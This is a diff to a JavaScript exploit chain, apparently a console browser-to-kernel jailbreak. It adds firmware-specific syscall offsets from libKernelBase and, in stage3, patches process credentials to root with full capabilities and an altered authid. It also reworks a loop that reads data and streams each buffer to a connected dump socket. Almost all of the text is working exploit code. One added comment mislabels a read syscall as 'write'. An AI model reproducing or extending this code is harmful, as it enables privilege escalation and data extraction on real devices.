@@ -738,7 +738,10 @@ function stage2() {
   var countbytes;
   //alert("before syscalls");
 
+//0.85.070
+  window.syscalls[3] = window.libKernelBase.add32(0x322d0);//write
   window.syscalls[4] = window.libKernelBase.add32(0x30c90);//write
+  window.syscalls[5] = window.libKernelBase.add32(0x300d0);//open
   window.syscalls[20] = window.libKernelBase.add32(0x31c30);//getpid
   window.syscalls[23] = window.libKernelBase.add32(0x2fd50);//setuid
   window.syscalls[54] = window.libKernelBase.add32(0x30110);//ioctl
@@ -1310,7 +1313,7 @@ function stage3() {
   let caps_store            = p.malloc(0x8);
   
   p.write8(uid_store_across, new int64(0x00000000, 0x00000000));
-  p.write8(authid_store, new int64(0x00000010, 0x48000000));
+  p.write8(authid_store, new int64(0x00000013, 0x48010000));
   p.write8(caps_store, new int64(0xffffffff, 0xffffffff));
 
   // Patch creds
@@ -1332,17 +1335,18 @@ function stage3() {
   alert("connected dump sock? 0x" + connect_res);
 
   for (let pfn = 0; ; pfn++) {
-      let read = chain.syscall(0x003, fd, buf, buf_size);//read
+      let read = chain.syscall(0x003, fd, buf, 0x1000);//read
+	  let write = chain.syscall(0x004, dump_sock_fd, buf, read);//write
 	  
 	if(pfn == 0){  
-	  
+	    
 		if(read.low == 0xffffffff){
 		  alert("failed to read, error -1");
 		}
 		else{
 		alert("read successfully, 0x" + read);
 		}
-		let write = chain.syscall(0x004, dump_sock_fd, buf, read);//write
+		
 		if(write.low == 0xffffffff){
 		  alert("failed to write, error -1");
 		}
